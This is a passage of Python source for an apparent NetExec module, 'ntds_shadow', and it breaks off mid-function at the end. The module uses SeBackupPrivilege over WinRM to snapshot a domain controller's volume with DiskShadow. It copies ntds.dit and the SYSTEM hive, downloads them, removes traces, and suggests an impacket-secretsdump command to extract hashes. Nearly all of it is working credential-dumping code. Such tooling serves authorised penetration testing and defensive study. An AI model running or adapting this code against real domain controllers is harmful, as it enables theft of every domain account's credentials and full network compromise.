r"""Retrieve NTDS.dit and the SYSTEM hive through DiskShadow over WinRM.

The module is intended for accounts with SeBackupPrivilege. It tracks the
snapshot created during the run from DiskShadow's output and only removes that
specific snapshot during cleanup.

Limitations:
  - WinRM transport only (no SMB, no DCOM)
  - Standard C: system volume assumed
  - Standard NTDS location (C:\\Windows\\NTDS\\ntds.dit)
  - English DiskShadow output required for transcript parsing
  - Hash extraction is not performed but the next steps are shown by the module.

Validated on Windows Server 2019 and Windows Server 2022.
"""

import json
import os
import re
import secrets
import shlex
import tempfile
from contextlib import suppress

from nxc.helpers.misc import CATEGORY

# GUID parsing

_GUID_RE = re.compile(
    r"\{([0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}"
    r"-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12})\}",
    re.IGNORECASE,
)


def _norm(raw: str) -> str:
    """Uppercase a GUID string, stripping surrounding braces if present."""
    return raw.strip("{}").upper()


_EXPOSE_CONFIRM_RE = re.compile(
    r"(?im)"
    r"^[ \t]*"
    r"the[ \t]+shadow[ \t]+copy[ \t]+was[ \t]+successfully[ \t]+exposed[ \t]+as[ \t]+"
    r"([A-Za-z]):\\\."
    r"[ \t\r]*$"
)

_CLEANUP_DELETING_RE = re.compile(
    r"Deleting shadow copy \{([^}]+)\}\.\.\.",
    re.IGNORECASE,
)

_CLEANUP_COUNT_RE = re.compile(
    r"(\d+) shadow cop(?:y|ies) deleted\.",
    re.IGNORECASE,
)


def parse_alias_guid(stdout: str, alias: str) -> str | None:
    """Return the GUID from a single valid DiskShadow alias mapping."""
    pattern = re.compile(
        rf"(?:%{re.escape(alias)}%|{re.escape(alias)})\s*=\s*\{{([^}}]+)\}}",
        re.IGNORECASE | re.MULTILINE,
    )
    matches = pattern.findall(stdout)
    if not matches:
        return None
    if len(matches) > 1:
        raise ValueError(
            f"[ntds_shadow] parse_alias_guid: {len(matches)} alias-to-GUID "
            f"mappings found for alias {alias!r}; exactly one required"
        )
    raw = matches[0]
    m = _GUID_RE.fullmatch(f"{{{raw}}}")
    if not m:
        raise ValueError(
            f"[ntds_shadow] parse_alias_guid: malformed GUID {raw!r} "
            f"for alias {alias!r}"
        )
    return _norm(m.group(1))


def parse_expose_confirmation(stdout: str, drive_letter: str) -> bool:
    """Check that DiskShadow exposed the snapshot on the expected drive."""
    matches = _EXPOSE_CONFIRM_RE.findall(stdout)
    if not matches:
        return False
    if len(matches) > 1:
        raise ValueError(
            f"[ntds_shadow] parse_expose_confirmation: {len(matches)} "
            "expose confirmation lines found; exactly one expected"
        )
    confirmed = matches[0].upper().rstrip(":")
    expected = drive_letter.upper().rstrip(":")
    return confirmed == expected


def parse_diskshadow_cleanup_transcript(stdout: str, verified_guid: str) -> None:
    """Confirm that DiskShadow deleted exactly the expected snapshot."""
    deleting_matches = _CLEANUP_DELETING_RE.findall(stdout)
    if not deleting_matches:
        raise ValueError(
            "parse_diskshadow_cleanup_transcript: "
            "no 'Deleting shadow copy' line found in transcript"
        )
    if len(deleting_matches) > 1:
        raise ValueError(
            f"parse_diskshadow_cleanup_transcript: "
            f"{len(deleting_matches)} 'Deleting shadow copy' lines found; "
            "exactly one expected"
        )
    raw_guid = deleting_matches[0]
    m = _GUID_RE.fullmatch(f"{{{raw_guid}}}")
    if not m:
        raise ValueError(
            f"parse_diskshadow_cleanup_transcript: malformed GUID {raw_guid!r} "
            "in 'Deleting shadow copy' line"
        )
    found_guid = _norm(m.group(1))
    expected_guid = _norm(verified_guid)
    if found_guid != expected_guid:
        raise ValueError(
            f"parse_diskshadow_cleanup_transcript: GUID mismatch — "
            f"expected {expected_guid!r}, found {found_guid!r}"
        )
    count_matches = _CLEANUP_COUNT_RE.findall(stdout)
    if not count_matches:
        raise ValueError(
            "parse_diskshadow_cleanup_transcript: "
            "no deletion count line found in transcript"
        )
    if len(count_matches) > 1:
        raise ValueError(
            f"parse_diskshadow_cleanup_transcript: "
            f"{len(count_matches)} deletion count lines found; exactly one expected"
        )
    count = count_matches[0]
    if count != "1":
        raise ValueError(
            f"parse_diskshadow_cleanup_transcript: "
            f"expected deletion count 1, got {count!r}"
        )


def parse_drive_letters(ps_output: str) -> set[str]:
    r"""
    Parse occupied drive letters from ``[System.IO.DriveInfo]::GetDrives()`` output.

    Expects lines like ``C:\``, ``D:\``.  Returns a set like ``{'C:', 'D:'}``.
    """
    letters: set[str] = set()
    for line in ps_output.splitlines():
        token = line.strip().rstrip("\\")
        if len(token) == 2 and token[1] == ":" and token[0].isalpha():
            letters.add(token.upper())
    return letters


def select_drive_letter(occupied: set[str]) -> str | None:
    """
    Choose the highest available drive letter from Z: downward.

    Never returns A, B, or C.  Returns the letter character (e.g. ``'Z'``)
    or None if no letter is available.
    """
    forbidden = {"A", "B", "C"} | {x.rstrip(":").upper() for x in occupied}
    for letter in "ZYXWVUTSRQPONMLKJIHGFED":
        if letter not in forbidden:
            return letter
    return None


def parse_remote_file_size(stdout: str, stderr: str, rc: int) -> int:
    r"""
    Parse a decimal file size from the output of a language-neutral cmd.exe query::

        for %I in ("<path>") do @echo %~zI

    Returns the file size as an integer > 0.

    Raises ``ValueError`` if:

    - *rc* is non-zero;
    - *stderr* is non-empty after stripping;
    - *stdout* contains no lines after stripping blank lines;
    - *stdout* contains no line matching ``\d+`` exactly;
    - *stdout* contains more than one numeric line;
    - the numeric value is zero (file is empty).
    """
    if rc != 0:
        raise ValueError(f"file-size query failed (rc={rc})")
    if stderr.strip():
        raise ValueError(f"file-size query non-empty stderr: {stderr.strip()!r}")
    lines = [line.strip() for line in stdout.splitlines() if line.strip()]
    if not lines:
        raise ValueError("file-size query produced no output — file may not exist")
    numeric = [line for line in lines if re.fullmatch(r"\d+", line)]
    if not numeric:
        raise ValueError(f"file-size query: no numeric line found; got {lines!r}")
    if len(numeric) > 1:
        raise ValueError(f"file-size query: multiple numeric lines: {numeric!r}")
    size = int(numeric[0])
    if size == 0:
        raise ValueError("file-size query: remote file is empty (size=0)")
    return size


def build_create_script(alias: str, cab_path: str, drive_letter: str) -> str:
    """Return DiskShadow create-script content (ASCII, CRLF line endings)."""
    lines = [
        "set verbose on",
        "set context persistent nowriters",
        f"set metadata {cab_path}",
        f"add volume C: alias {alias}",
        "create",
        f"expose %{alias}% {drive_letter}:",
        "exit",
    ]
    return "\r\n".join(lines) + "\r\n"


def build_cleanup_script(drive_letter: str, shadow_guid: str) -> str:
    """
    Return DiskShadow cleanup-script content (ASCII, CRLF line endings).

    Unexposes the drive letter then deletes the specific snapshot GUID.
    Used when exposure was reported or verified and the exact GUID is known.
    Only 'verified_shadow_guid' may be passed as *shadow_guid*.
    """
    lines = [
        "set verbose on",
        f"unexpose {drive_letter}:",
        f"delete shadows id {{{shadow_guid}}}",
        "exit",
    ]
    return "\r\n".join(lines) + "\r\n"


def build_delete_only_script(shadow_guid: str) -> str:
    """
    Return DiskShadow delete-only script content (ASCII, CRLF line endings).

    Deletes the specific snapshot GUID without attempting to unexpose a drive.
    Used when snapshot ownership is established but exposure was never confirmed.
    Only 'verified_shadow_guid' may be passed as *shadow_guid*.
    """
    lines = [
        "set verbose on",
        f"delete shadows id {{{shadow_guid}}}",
        "exit",
    ]
    return "\r\n".join(lines) + "\r\n"


def build_secretsdump_command(system_path: str, ntds_path: str) -> str:
    """Return an impacket-secretsdump next-step hint with shell-quoted artifact paths."""
    return (
        f"impacket-secretsdump -system {shlex.quote(system_path)} "
        f"-ntds {shlex.quote(ntds_path)} LOCAL"
    )


class RunState:
    """All mutable state for one module invocation, keyed by run_id."""

    def __init__(self, run_id: str):
        self.run_id = run_id
        base = r"C:\Windows\Temp"

        self.alias = f"nxcshadow{run_id}"

        # Keep every remote artifact inside the run-specific directory.
        self.staging_dir = rf"{base}\nxc-{run_id}"
        self.create_script = rf"{self.staging_dir}\ds-create.txt"
        self.cleanup_script = rf"{self.staging_dir}\ds-cleanup.txt"
        self.cab_file = rf"{self.staging_dir}\shadow.cab"

        self.drive_letter: str | None = None

        # Only this GUID is passed to the cleanup script.
        self.verified_shadow_guid: str | None = None

        self.staging_dir_created: bool = False
        self.diskshadow_invoked: bool = False
        self.expose_reported: bool = False

        self.remote_ntds_path = rf"{self.staging_dir}\ntds.dit"
        self.remote_system_path = rf"{self.staging_dir}\SYSTEM.hive"

        # Track attempted copies so partial files are also removed.
        self.ntds_copy_attempted: bool = False
        self.system_save_attempted: bool = False

        self.ntds_copied: bool = False
        self.system_saved: bool = False

        self.remote_ntds_size: int | None = None
        self.remote_system_size: int | None = None

        self.local_evidence_dir: str | None = None
        self.local_ntds_path: str | None = None
        self.local_system_path: str | None = None

        self.ntds_downloaded: bool = False
        self.system_downloaded: bool = False

        self.local_ntds_size: int | None = None
        self.local_system_size: int | None = None

        self.cleanup_had_failure: bool = False

    def residual_paths(self) -> list[str]:
        """Remote paths created by this run (for residual reporting on failure)."""
        return [
            self.create_script,
            self.cleanup_script,
            self.cab_file,
            self.staging_dir,
        ]


class _ModuleAbort(Exception):
    """Raised to stop _run() cleanly and switch to _cleanup()."""


class NXCModule:
    """Retrieve NTDS.dit and the SYSTEM hive through DiskShadow over WinRM."""

    name = "ntds_shadow"
    description = (
        "Creates and exposes a DiskShadow snapshot on a domain controller using "
        "SeBackupPrivilege, downloads NTDS.dit and the SYSTEM hive, validates the "
        "local artifacts and removes the remote artifacts and verified shadow copy."
    )
    supported_protocols = ["winrm"]
    opsec_safe = False
    multiple_hosts = False
    category = CATEGORY.CREDENTIAL_DUMPING

    def options(self, context, module_options):
        """No configuration options. Present for NetExec module interface compatibility."""

    def on_login(self, context, connection):
        run_id = secrets.token_hex(4)
        state = RunState(run_id)

        context.log.debug(f"run_id={run_id}  staging={state.staging_dir}")
        try:
            self._run(context, connection, state)
        except _ModuleAbort as exc:
            context.log.fail(f"Aborted: {exc}")
        except Exception as exc:
            context.log.fail(f"Unexpected error: {exc!r}")
        finally:
            self._cleanup(context, connection, state)

    def _run(self, context, connection, state: RunState) -> None:
        conn = connection.conn

        self._phase_token_info(context, conn)
        self._phase_check_ntds_path(context, conn)
        self._phase_staging(context, conn, state)
        self._phase_drive_letter(context, conn, state)
        self._phase_upload_create_script(context, conn, state)
        context.log.display("Creating DiskShadow snapshot...")
        self._phase_diskshadow_create(context, conn, state)
        self._phase_verify_exposure(context, conn, state)
        context.log.success("Snapshot created and NTDS accessible")
        context.log.display("Acquiring NTDS database and SYSTEM hive...")
        self._phase_ntds_copy(context, conn, state)
        self._phase_system_save(context, conn, state)
        self._phase_prepare_local_dir(context, connection, state)
        self._phase_download_ntds(context, connection, state)
        self._phase_download_system(context, connection, state)
        self._phase_verify_local_artifacts(context, state)
        context.log.success("NTDS database and SYSTEM hive downloaded")
        context.log.display(
            f"ntds.dit: {state.local_ntds_path} ({state.local_ntds_size} bytes)"
        )
        context.log.display(
            f"SYSTEM.hive: {state.local_system_path} ({state.local_system_size} bytes)"
        )

    def _phase_token_info(self, context, conn) -> None:
        """Check whether SeBackupPrivilege is available."""
        context.log.debug("Checking token privileges")

        stdout, _stderr, _rc = _run_cmd(conn, "whoami /priv /fo csv /nh")
        has_backup = _log_priv_rows(context, stdout)
        if not has_backup:
            raise _ModuleAbort("SeBackupPrivilege not present")
        context.log.success("SeBackupPrivilege confirmed")

    def _phase_staging(self, context, conn, state: RunState) -> None:
        """Create a temporary directory for this run."""
        context.log.debug(f"Creating staging directory: {state.staging_dir}")
        stdout, stderr, rc = _run_cmd(conn, f'mkdir "{state.staging_dir}"')
        if rc != 0:
            raise _ModuleAbort(f"mkdir failed (rc={rc}): {stderr.strip()}")
        state.staging_dir_created = True

    def _phase_drive_letter(self, context, conn, state: RunState) -> None:
        """Find an unused drive letter."""
        context.log.debug("Looking for an unused drive letter")
        output, _streams, had_errors = conn.execute_ps(
            "[System.IO.DriveInfo]::GetDrives() "
            "| ForEach-Object { $_.Name.TrimEnd('\\') }"
        )
        if had_errors:
            raise _ModuleAbort("PowerShell query for drive letters failed")
        occupied = parse_drive_letters(output)
        letter = select_drive_letter(occupied)
        if not letter:
            raise _ModuleAbort("No available drive letter (Z:-D: all occupied)")
        state.drive_letter = letter
        context.log.debug(f"Selected drive letter: {letter}:")

    def _phase_upload_create_script(self, context, conn, state: RunState) -> None:
        """Build and upload the DiskShadow script."""
        context.log.debug("Running DiskShadow")
        content = build_create_script(state.alias, state.cab_file, state.drive_letter)
        _upload_script(conn, content, state.create_script)

    def _phase_diskshadow_create(self, context, conn, state: RunState) -> None:
        """Create the snapshot and record its GUID for cleanup."""
        context.log.debug("Creating DiskShadow snapshot")
        # Set this first so a failed command still produces a cleanup warning.
        state.diskshadow_invoked = True

        try:
            stdout, stderr, rc = _run_cmd(
                conn, f'diskshadow.exe /s "{state.create_script}"'
            )
        except RuntimeError as exc:
            raise _ModuleAbort(
                f"DiskShadow transport failed — no GUID, can't clean up: {exc}"
            ) from exc

        context.log.debug(f"diskshadow stdout:\n{stdout}")
        if stderr.strip():
            context.log.debug(f"diskshadow stderr:\n{stderr}")

        # Parse the alias first. Later checks may fail after the snapshot exists.
        try:
            guid = parse_alias_guid(stdout, state.alias)
        except ValueError as exc:
            raise _ModuleAbort(
                f"DiskShadow alias output is ambiguous — snapshot ownership "
                f"cannot be established: {exc}"
            ) from exc

        if guid is None:
            raise _ModuleAbort(
                "No alias-to-GUID mapping found in DiskShadow stdout — "
                "no GUID, can't clean up"
            )

        state.verified_shadow_guid = guid
        context.log.debug(f"Snapshot ownership established: {guid}")

        if rc != 0:
            raise _ModuleAbort(
                f"DiskShadow returned rc={rc} "
                f"(ownership established — cleanup will delete exact GUID)"
            )
        if stderr.strip():
            raise _ModuleAbort(
                f"DiskShadow returned non-empty stderr "
                f"(ownership established): {stderr.strip()!r}"
            )
        stdout_lower = stdout.lower()
        if any(tok in stdout_lower for tok in ("error", "failed", "0x8")):
            raise _ModuleAbort(
                f"DiskShadow reported a failure indicator in stdout "
                f"(ownership established):\n{stdout}"
            )

        try:
            expose_ok = parse_expose_confirmation(stdout, state.drive_letter)
        except ValueError as exc:
            raise _ModuleAbort(
                f"DiskShadow expose confirmation ambiguous "
                f"(ownership established): {exc}"
            ) from exc
        if not expose_ok:
            raise _ModuleAbort(
                f"DiskShadow expose confirmation missing or names wrong drive "
                f"(expected {state.drive_letter}:, ownership established)"
            )
        state.expose_reported = True
        context.log.debug(f"Snapshot exposed at {state.drive_letter}:")

    def _phase_verify_exposure(self, context, conn, state: RunState) -> None:
        """Check that NTDS.dit is accessible through the snapshot."""
        context.log.debug("Checking NTDS.dit in the snapshot")
        stdout, stderr, rc = _run_cmd(
            conn, f'dir "{state.drive_letter}:\\Windows\\NTDS\\ntds.dit"'
        )
        if rc != 0 or stderr.strip():
            raise _ModuleAbort(
                f"ntds.dit not visible at {state.drive_letter}:\\Windows\\NTDS\\ "
                f"(rc={rc})"
            )
        if "File Not Found" in stdout or "cannot find" in stdout.lower():
            raise _ModuleAbort(
                f"ntds.dit not visible at {state.drive_letter}:\\Windows\\NTDS\\ "
                f"(rc={rc})"
            )
        context.log.debug(
            f"ntds.dit confirmed at {state.drive_letter}:\\Windows\\NTDS\\ntds.dit"
        )

    def _phase_check_ntds_path(self, context, conn) -> None:
        """Check that NTDS.dit is accessible before creating any remote files."""
        context.log.debug(r"NTDS path: dir %SystemRoot%\NTDS\ntds.dit")
        try:
            _stdout, _stderr, rc = _run_cmd(conn, r'dir "%SystemRoot%\NTDS\ntds.dit"')
        except RuntimeError as exc:
            raise _ModuleAbort(f"NTDS path transport failed: {exc}") from exc
        if rc != 0:
            raise _ModuleAbort(
                r"NTDS path: %SystemRoot%\NTDS\ntds.dit not accessible — "
                "confirm this is a Domain Controller with Backup Operators access"
            )
        context.log.debug("NTDS path passed")

    def _phase_prepare_local_dir(self, context, connection, state: RunState) -> None:
        """Create a separate local directory for the downloaded files."""
        context.log.debug("Preparing local output directory")

        if not callable(getattr(connection.conn, "fetch", None)):
            raise _ModuleAbort(
                "fetch() not available on WinRM connection object — "
                "file download requires a pypsrp Client connection"
            )

        if not (
            state.ntds_copied
            and state.system_saved
            and state.remote_ntds_size
            and state.remote_system_size
        ):
            raise _ModuleAbort(
                "Download precondition not met — both remote artifacts must be "
                "successfully staged and size-verified before local download"
            )

        tmpl = getattr(connection, "output_file_template", None)
        if not isinstance(tmpl, str):
            raise _ModuleAbort(
                "connection.output_file_template is not set or not a string — "
                "cannot determine local evidence path"
            )
        try:
            output_base = tmpl.format(output_folder="ntds")
        except (KeyError, ValueError) as exc:
            raise _ModuleAbort(
                f"output_file_template.format(output_folder='ntds') failed: {exc}"
            ) from exc
        if not output_base.strip():
            raise _ModuleAbort("output_file_template produced an empty path")

        parent = os.path.dirname(output_base)
        base_name = os.path.basename(output_base)
        evidence_dir = os.path.join(parent, f"{base_name}_diskshadow_{state.run_id}")

        state.local_evidence_dir = evidence_dir
        state.local_ntds_path = os.path.join(evidence_dir, "ntds.dit")
        state.local_system_path = os.path.join(evidence_dir, "SYSTEM.hive")

        try:
            os.makedirs(parent, exist_ok=True)
        except OSError as exc:
            raise _ModuleAbort(
                f"Failed to create local parent directory {parent!r}: {exc}"
            ) from exc

        # Do not reuse an existing output directory.
        try:
            os.mkdir(evidence_dir, mode=0o700)
        except FileExistsError:
            raise _ModuleAbort(
                f"Local evidence directory already exists — refusing to overwrite: "
                f"{evidence_dir!r}"
            ) from None
        except OSError as exc:
            raise _ModuleAbort(
                f"Failed to create local evidence directory {evidence_dir!r}: {exc}"
            ) from exc

        context.log.debug(f"Local evidence directory created: {evidence_dir}")

    def _phase_download_ntds(self, context, connection, state: RunState) -> None:
        """Fetch ntds.dit via connection.conn.fetch()."""
        context.log.debug("Downloading ntds.dit")
        try:
            connection.conn.fetch(state.remote_ntds_path, state.local_ntds_path)
        except Exception as exc:
            if os.path.exists(state.local_ntds_path):
                context.log.fail(
                    f"Partial ntds.dit retained at "
                    f"{state.local_ntds_path!r} — do not delete manually; "
                    f"evidence directory: {state.local_evidence_dir}"
                )
            raise _ModuleAbort(
                f"ntds.dit fetch failed ({type(exc).__name__}): {exc}"
            ) from exc

    def _phase_download_system(self, context, connection, state: RunState) -> None:
        """Fetch SYSTEM.hive via connection.conn.fetch()."""
        context.log.debug("Downloading SYSTEM.hive")
        try:
            connection.conn.fetch(state.remote_system_path, state.local_system_path)
        except Exception as exc:
            if os.path.exists(state.local_system_path):
                context.log.fail(
                    f"Partial SYSTEM.hive retained at "
                    f"{state.local_system_path!r} — do not delete manually; "
                    f"evidence directory: {state.local_evidence_dir}"
                )
            raise _ModuleAbort(
                f"SYSTEM.hive fetch failed ({type(exc).__name__}): {exc}"
            ) from exc

    def _phase_verify_local_artifacts(self, context, state: RunState) -> None:
        """Verify both local artifacts against remote-verified sizes."""
        context.log.debug("Verifying downloaded files")

        # ntds.dit
        ntds_path = state.local_ntds_path
        if not os.path.exists(ntds_path):
            raise _ModuleAbort(f"ntds.dit missing after fetch: {ntds_path!r}")
        if not os.path.isfile(ntds_path):
            raise _ModuleAbort(f"ntds.dit is not a regular file: {ntds_path!r}")
        local_ntds_size = os.path.getsize(ntds_path)
        if local_ntds_size == 0:
            raise _ModuleAbort(f"ntds.dit is empty (size=0): {ntds_path!r}")
        if local_ntds_size != state.remote_ntds_size:
            context.log.fail(
                f"ntds.dit size mismatch — "
                f"local={local_ntds_size} B, remote={state.remote_ntds_size} B. "
                f"Partial/unverified file retained at {ntds_path!r}"
            )
            raise _ModuleAbort(
                f"ntds.dit size mismatch: local={local_ntds_size} "
                f"remote={state.remote_ntds_size}"
            )
        state.ntds_downloaded = True
        state.local_ntds_size = local_ntds_size
        context.log.debug(f"ntds.dit verified: {local_ntds_size} B at {ntds_path}")

        # SYSTEM.hive
        sys_path = state.local_system_path
        if not os.path.exists(sys_path):
            raise _ModuleAbort(f"SYSTEM.hive missing after fetch: {sys_path!r}")
        if not os.path.isfile(sys_path):
            raise _ModuleAbort(f"SYSTEM.hive is not a regular file: {sys_path!r}")
        local_system_size = os.path.getsize(sys_path)
        if local_system_size == 0:
            raise _ModuleAbort(f"SYSTEM.hive is empty (size=0): {sys_path!r}")
        if local_system_size != state.remote_system_size:
            context.log.fail(
                f"SYSTEM.hive size mismatch — "
                f"local={local_system_size} B, remote={state.remote_system_size} B. "
                f"Partial/unverified file retained at {sys_path!r}"
            )
            raise _ModuleAbort(
                f"SYSTEM.hive size mismatch: local={local_system_size} "
                f"remote={state.remote_system_size}"
            )
        state.system_downloaded = True
        state.local_system_size = local_system_size
        context.log.debug(f"SYSTEM.hive verified: {local_system_size} B at {sys_path}")

    def _phase_ntds_copy(self, context, conn, state: RunState) -> None:
        """Copy NTDS.dit from the snapshot to the staging directory."""
        context.log.debug("Copying NTDS.dit from the snapshot")
        cmd = (
            f'robocopy /B "{state.drive_letter}:\\Windows\\NTDS" '
            f'"{state.staging_dir}" ntds.dit '
            f"/COPY:DAT /DCOPY:T /R:0 /W:0 /NP /NJH /NJS"
        )
        state.ntds_copy_attempted = True
        try:
            stdout, stderr, rc = _run_cmd(conn, cmd)
        except RuntimeError as exc:
            raise _ModuleAbort(f"robocopy NTDS transport failed: {exc}") from exc
        if stderr.strip():
            raise _ModuleAbort(
                f"robocopy NTDS non-empty stderr (rc={rc}): {stderr.strip()!r}"
            )
        if rc >= 8:
            raise _ModuleAbort(f"robocopy NTDS failed (rc={rc})")
        if rc == 0:
            context.log.debug(
                "robocopy rc=0 (no-copy status) — verifying artifact independently"
            )
        # Verify the staged file size.
        try:
            sz_out, sz_err, sz_rc = _run_cmd(
                conn,
                f'for %I in ("{state.remote_ntds_path}") do @echo %~zI',
            )
        except RuntimeError as exc:
            raise _ModuleAbort(f"ntds.dit size query transport failed: {exc}") from exc
        try:
            size = parse_remote_file_size(sz_out, sz_err, sz_rc)
        except ValueError as exc:
            raise _ModuleAbort(f"ntds.dit size verification failed: {exc}") from exc
        state.remote_ntds_size = size
        state.ntds_copied = True
        context.log.debug(f"ntds.dit staged: {size} bytes → {state.remote_ntds_path}")

    def _phase_system_save(self, context, conn, state: RunState) -> None:
        """Save the SYSTEM registry hive to the staging directory."""
        context.log.debug("Saving the SYSTEM registry hive")
        state.system_save_attempted = True
        try:
            stdout, stderr, rc = _run_cmd(
                conn,
                f'reg.exe save HKLM\\SYSTEM "{state.remote_system_path}" /y',
            )
        except RuntimeError as exc:
            raise _ModuleAbort(f"reg save SYSTEM transport failed: {exc}") from exc
        if stderr.strip():
            raise _ModuleAbort(
                f"reg save SYSTEM non-empty stderr (rc={rc}): {stderr.strip()!r}"
            )
        if rc != 0:
            raise _ModuleAbort(f"reg save SYSTEM failed (rc={rc})")
        # Verify the staged file size.
        try:
            sz_out, sz_err, sz_rc = _run_cmd(
                conn,
                f'for %I in ("{state.remote_system_path}") do @echo %~zI',
            )
        except RuntimeError as exc:
            raise _ModuleAbort(
                f"SYSTEM.hive size query transport failed: {exc}"
            ) from exc
        try:
            size = parse_remote_file_size(sz_out, sz_err, sz_rc)
        except ValueError as exc:
            raise _ModuleAbort(f"SYSTEM.hive size verification failed: {exc}") from exc
        state.remote_system_size = size
        state.system_saved = True
        context.log.debug(
            f"SYSTEM.hive staged: {size} bytes → {state.remote_system_path}"
        )

    def _cleanup(self, context, connection, state: RunState) -> None:
        """Remove remote artifacts and the snapshot created by this run."""
        conn = connection.conn
        context.log.debug("Cleanup starting")

        if state.ntds_copy_attempted or state.system_save_attempted:
            self._cleanup_remote_artifacts(context, conn, state)

        if state.verified_shadow_guid:
            self._cleanup_diskshadow(context, conn, state)
        elif state.diskshadow_invoked:
            context.log.fail(
                "DiskShadow was invoked but no snapshot GUID was "
                "identified. Manual cleanup: inspect DiskShadow logs for any "
                "snapshot created during this run."
            )
            state.cleanup_had_failure = True

        if state.staging_dir_created:
            try:
                _out, _err, rc = _run_cmd(conn, f'rmdir /s /q "{state.staging_dir}"')
                if rc != 0:
                    context.log.fail(f"Staging dir not removed: {state.staging_dir}")
                    for path in state.residual_paths():
                        context.log.fail(f"  residual: {path}")
                    state.cleanup_had_failure = True
                else:
                    context.log.debug(f"Staging dir removed: {state.staging_dir}")
            except Exception as exc:
                context.log.fail(
                    f"Staging dir removal exception: {exc!r}. "
                    f"Residual: {state.staging_dir}"
                )
                state.cleanup_had_failure = True

        self._verify_cleanup(context, conn, state)

        _anything_done = (
            state.staging_dir_created
            or state.diskshadow_invoked
            or state.ntds_copy_attempted
            or state.system_save_attempted
        )
        if not state.cleanup_had_failure and _anything_done:
            context.log.success("Remote artifacts and shadow copy removed")
            if (
                state.ntds_downloaded
                and state.system_downloaded
                and state.local_ntds_path
                and state.local_system_path
            ):
                context.log.display(
                    "Next step: "
                    + build_secretsdump_command(
                        state.local_system_path, state.local_ntds_path
                    )
                )

    def _cleanup_diskshadow(self, context, conn, state: RunState) -> None:
        """
        Upload and execute the DiskShadow cleanup script.

        Selects the full cleanup script (unexpose + delete) when exposure was
        reported or verified and a drive letter is known; selects a delete-only
        script otherwise.

        Only the verified GUID is passed here.
        """
        try:
            if state.expose_reported and state.drive_letter:
                content = build_cleanup_script(
                    state.drive_letter, state.verified_shadow_guid
                )
            else:
                content = build_delete_only_script(state.verified_shadow_guid)
            _upload_script(conn, content, state.cleanup_script)
            stdout, stderr, rc = _run_cmd(
                conn, f'diskshadow.exe /s "{state.cleanup_script}"'
            )
            context.log.debug(f"cleanup diskshadow stdout:\n{stdout}")

            if rc != 0:
                context.log.fail(
                    f"DiskShadow cleanup rc={rc}. "
                    f"Snapshot {state.verified_shadow_guid} may remain. "
                    f"Manual cleanup: diskshadow /s <script> with "
                    f"DELETE SHADOWS ID {{{state.verified_shadow_guid}}}"
                )
                state.cleanup_had_failure = True
                return
            if stderr.strip():
                context.log.fail(
                    f"DiskShadow cleanup non-empty stderr. "
                    f"Snapshot {state.verified_shadow_guid} may remain. "
                    f"Manual cleanup: diskshadow /s <script> with "
                    f"DELETE SHADOWS ID {{{state.verified_shadow_guid}}}"
                )
                state.cleanup_had_failure = True
                return
            stdout_lower = stdout.lower()
            if any(tok in stdout_lower for tok in ("error", "failed", "0x8")):
                context.log.fail(
                    f"DiskShadow cleanup failure indicator in stdout. "
                    f"Snapshot {state.verified_shadow_guid} may remain. "
                    f"Manual cleanup: diskshadow /s <script> with "
                    f"DELETE SHADOWS ID {{{state.verified_shadow_guid}}}"
                )
                state.cleanup_had_failure = True
                return
            try:
                parse_diskshadow_cleanup_transcript(stdout, state.verified_shadow_guid)
            except ValueError as exc:
                context.log.fail(
                    f"DiskShadow cleanup transcript not confirmed: {exc}. "
                    f"Snapshot {state.verified_shadow_guid} may remain. "
                    f"Manual cleanup: diskshadow /s <script> with "
                    f"DELETE SHADOWS ID {{{state.verified_shadow_guid}}}"
                )
                state.cleanup_had_failure = True
                return
            context.log.debug(
                f"Snapshot {state.verified_shadow_guid} deleted (transcript confirmed)"
            )
        except Exception as exc:
            context.log.fail(
                f"DiskShadow cleanup failed: {exc!r}. "
                f"Snapshot {state.verified_shadow_guid} may remain. "
                f"Manual cleanup: diskshadow /s <script> with "
                f"DELETE SHADOWS ID {{{state.verified_shadow_guid}}}"
            )
            state.cleanup_had_failure = True

    def _cleanup_remote_artifacts(self, context, conn, state: RunState) -> None:
        """
        Delete ntds.dit and SYSTEM.hive from remote staging.

        Triggered by *_attempted flags (not success flags) so partial copies are
        also removed.
        """
        # ntds.dit
        if state.ntds_copy_attempted:
            try:
                _run_cmd(conn, f'del /f /q "{state.remote_ntds_path}"')
                _out, _err, v_rc = _run_cmd(
                    conn,
                    f'if exist "{state.remote_ntds_path}" (exit /b 1) else (exit /b 0)',
                )
                if v_rc != 0 or _err.strip():
                    context.log.fail(
                        f"RESIDUAL: ntds.dit may remain — "
                        f"delete manually: {state.remote_ntds_path}"
                    )
                    state.cleanup_had_failure = True
                else:
                    context.log.debug(
                        f"Remote ntds.dit deleted: {state.remote_ntds_path}"
                    )
            except Exception as exc:
                context.log.fail(
                    f"RESIDUAL: ntds.dit deletion failed: {exc!r} — "
                    f"delete manually: {state.remote_ntds_path}"
                )
                state.cleanup_had_failure = True

        # SYSTEM.hive
        if state.system_save_attempted:
            try:
                _run_cmd(conn, f'del /f /q "{state.remote_system_path}"')
                _out, _err, v_rc = _run_cmd(
                    conn,
                    f'if exist "{state.remote_system_path}" (exit /b 1) else (exit /b 0)',
                )
                if v_rc != 0 or _err.strip():
                    context.log.fail(
                        f"RESIDUAL: SYSTEM.hive may remain — "
                        f"delete manually: {state.remote_system_path}"
                    )
                    state.cleanup_had_failure = True
                else:
                    context.log.debug(
                        f"Remote SYSTEM.hive deleted: {state.remote_system_path}"
                    )
            except Exception as exc:
                context.log.fail(
                    f"RESIDUAL: SYSTEM.hive deletion failed: {exc!r} — "
                    f"delete manually: {state.remote_system_path}"
                )
                state.cleanup_had_failure = True

    def _verify_cleanup(self, context, conn, state: RunState) -> None:
        """
        Verify that drive and staging directory are gone after cleanup.
        Each check runs independently so that a failure
        in one does not suppress the remaining checks.
        """
        # Verify drive letter is gone (only if exposure was reported)
        if state.expose_reported and state.drive_letter:
            try:
                _out, _err, rc = _run_cmd(conn, f"dir {state.drive_letter}:\\")
                if rc == 0:
                    context.log.fail(
                        f"Drive {state.drive_letter}: still exists after cleanup"
                    )
                    state.cleanup_had_failure = True
                else:
                    context.log.debug(f"Drive {state.drive_letter}: removed")
            except Exception as exc:
                context.log.fail(f"Drive verification failed: {exc!r}")
                state.cleanup_had_failure = True

        # Verify staging directory is gone
        if state.staging_dir_created:
            try:
                _out, _err, rc = _run_cmd(conn, f'dir "{state.staging_dir}"')
                if rc == 0:
                    context.log.fail(f"Staging dir still exists: {state.staging_dir}")
                    state.cleanup_had_failure = True
                else:
